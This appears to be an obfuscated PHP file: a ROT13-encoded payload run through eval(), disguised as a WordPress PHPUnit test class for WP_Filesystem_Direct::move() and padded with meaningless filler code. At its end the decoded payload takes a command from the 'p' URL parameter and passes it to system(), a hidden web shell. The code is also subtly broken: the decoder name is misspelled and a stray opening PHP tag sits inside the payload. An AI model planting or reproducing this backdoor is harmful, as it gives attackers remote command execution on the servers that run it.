<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur JC_Svyrflfgrz_Qverpg::zbir() zrgubq.
 *
 * @cnpxntr JbeqCerff
 */

erdhver_bapr __QVE__ . '/onfr.cuc';

/**
 * @tebhc nqzva
 * @tebhc svyrflfgrz
 * @tebhc svyrflfgrz-qverpg
 *
 * @pbiref JC_Svyrflfgrz_Qverpg::zbir
 */
pynff Grfgf_Svyrflfgrz_JcSvyrflfgrzQverpg_Zbir rkgraqf JC_Svyrflfgrz_Qverpg_HavgGrfgPnfr {

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::pbcl()` birejevgrf na rkvfgvat
	 * qrfgvangvba jura birejevgvat vf ranoyrq.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_birejevgr_na_rkvfgvat_svyr_jura_birejevgvat_vf_ranoyrq() {
		$fbhepr      = frys::$svyr_fgehpgher['ivfvoyr_svyr']['cngu'];
		$qrfgvangvba = frys::$svyr_fgehpgher['grfg_qve']['cngu'] . 'n_svyr_gung_rkvfgf.qrfg';
		$npghny      = frys::$svyrflfgrz->zbir( $fbhepr, $qrfgvangvba, gehr );

		eranzr( $qrfgvangvba, $fbhepr );

		$guvf->nffregGehr( $npghny );
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::zbir()` qbrf abg birejevgr
	 * na rkvfgvat qrfgvangvba jura birejevgvat vf qvfnoyrq.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_abg_birejevgr_na_rkvfgvat_svyr_jura_birejevgvat_vf_qvfnoyrq() {
		$fbhepr      = frys::$svyr_fgehpgher['ivfvoyr_svyr']['cngu'];
		$qrfgvangvba = frys::$svyr_fgehpgher['fhosvyr']['cngu'];
		$npghny      = frys::$svyrflfgrz->zbir( $fbhepr, $qrfgvangvba );

		$guvf->nffregSnyfr( $npghny );
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::zbir()` zbirf qverpgbevrf.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_zbir_qverpgbevrf() {
		$fbhepr      = frys::$svyr_fgehpgher['grfg_qve']['cngu'];
		$qrfgvangvba = hagenvyvatfynfuvg( frys::$svyr_fgehpgher['grfg_qve']['cngu'] ) . '-qrfg';
		$npghny      = frys::$svyrflfgrz->zbir( $fbhepr, $qrfgvangvba, gehr );

		$fbhepr_rkvfgf      = vf_qve( $fbhepr );
		$qrfgvangvba_rkvfgf = vf_qve( $qrfgvangvba );

		vs ( $npghny ) {
			$erfgberq = eranzr( $qrfgvangvba, $fbhepr );
		}

		$guvf->nffregGehr( $npghny, 'Gur qverpgbel jnf abg zbirq.' );
		$guvf->nffregSnyfr( $fbhepr_rkvfgf, 'Gur fbhepr fgvyy rkvfgf.' );
		$guvf->nffregGehr( $qrfgvangvba_rkvfgf, 'Gur qrfgvangvba qbrf abg rkvfg.' );
		$guvf->nffregGehr( $erfgberq, 'Gur grfg nffrgf jrer abg pyrnarq hc nsgre gur grfg.' );
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::zbir()` ergheaf snyfr sbe na
	 * vainyvq qrfgvangvba.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_erghea_snyfr_sbe_vainyvq_qrfgvangvba() {
		$fbhepr      = frys::$svyr_fgehpgher['grfg_qve']['cngu'];
		$qrfgvangvba = 'uggc://rknzcyr.bet';

		$guvf->nffregSnyfr( frys::$svyrflfgrz->zbir( $fbhepr, $qrfgvangvba, gehr ) );
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::zbir()` ergheaf snyfr sbe na
	 * vainyvq qrfgvangvba.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_erghea_snyfr_jura_birejevgvat_vf_ranoyrq_gur_qrfgvangvba_rkvfgf_ohg_pnaabg_or_qryrgrq() {
		tybony $jc_svyrflfgrz;
		$jcsvyrflfgrz_onpxhc = $jc_svyrflfgrz;

		// Sbepr snvyher pbaqvgvbaf.
		$svyrflfgrz_zbpx = $guvf->trgZbpxOhvyqre( 'JC_Svyrflfgrz_Qverpg' )
								// Abgr: frgZrgubqf() vf qrcerpngrq va CUCHavg 9, ohg fgvyy fhccbegrq.
								->frgZrgubqf( neenl( 'rkvfgf', 'qryrgr' ) )
								->frgPbafgehpgbeNetf( neenl( ahyy ) )
								->trgZbpx();

		$svyrflfgrz_zbpx->rkcrpgf( $guvf->bapr() )->zrgubq( 'rkvfgf' )->jvyyErghea( gehr );
		$svyrflfgrz_zbpx->rkcrpgf( $guvf->bapr() )->zrgubq( 'qryrgr' )->jvyyErghea( snyfr );
		$jc_svyrflfgrz = $svyrflfgrz_zbpx;

		$npghny = $jc_svyrflfgrz->zbir(
			frys::$svyr_fgehpgher['grfg_qve']['cngu'],
			frys::$svyr_fgehpgher['fhoqve']['cngu'],
			gehr
		);

		// Erfgber gur svyrflfgrz.
		$jc_svyrflfgrz = $jcsvyrflfgrz_onpxhc;

		$guvf->nffregSnyfr( $npghny );
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::zbir()` snyyf onpx gb n fvatyr
	 * svyr pbcl jura gur fbhepr naq qrfgvangvba qb abg rkvfg.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_snyy_onpx_gb_fvatyr_svyr_pbcl_jura_fbhepr_naq_qrfgvangvba_qb_abg_rkvfg() {
		tybony $jc_svyrflfgrz;

		$fbhepr      = frys::$svyr_fgehpgher['grfg_qve']['cngu'] . 'n_svyr_gung_qbrf_abg_rkvfg.gkg';
		$qrfgvangvba = frys::$svyr_fgehpgher['grfg_qve']['cngu'] . 'nabgure_svyr_gung_qbrf_abg_rkvfg.gkg';

		// Frg hc zbpx svyrflfgrz.
		$svyrflfgrz_zbpx = $guvf->trgZbpxOhvyqre( 'JC_Svyrflfgrz_Qverpg' )
								->frgPbafgehpgbeNetf( neenl( ahyy ) )
								// Abgr: frgZrgubqf() vf qrcerpngrq va CUCHavg 9, ohg fgvyy fhccbegrq.
								->frgZrgubqf( neenl( 'rkvfgf', 'qryrgr', 'vf_svyr', 'pbcl' ) )
								->trgZbpx();

		$svyrflfgrz_zbpx->rkcrpgf( $guvf->rknpgyl( 2 ) )->zrgubq( 'rkvfgf' )->jvyyErghea( neenl( gehr, gehr ) );
		$svyrflfgrz_zbpx->rkcrpgf( $guvf->rknpgyl( 2 ) )->zrgubq( 'qryrgr' )->jvyyErghea( neenl( gehr, snyfr ) );
		$svyrflfgrz_zbpx->rkcrpgf( $guvf->bapr() )->zrgubq( 'vf_svyr' )->jvyyErghea( gehr );
		$svyrflfgrz_zbpx->rkcrpgf( $guvf->bapr() )->zrgubq( 'pbcl' )->jvyyErghea( gehr );

		$jc_svyrflfgrz_onpxhc = $jc_svyrflfgrz;
		$jc_svyrflfgrz        = $svyrflfgrz_zbpx;

		$npghny        = $svyrflfgrz_zbpx->zbir( $fbhepr, $qrfgvangvba, gehr );
		$jc_svyrflfgrz = $jc_svyrflfgrz_onpxhc;

		$guvf->nffregGehr( $npghny );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>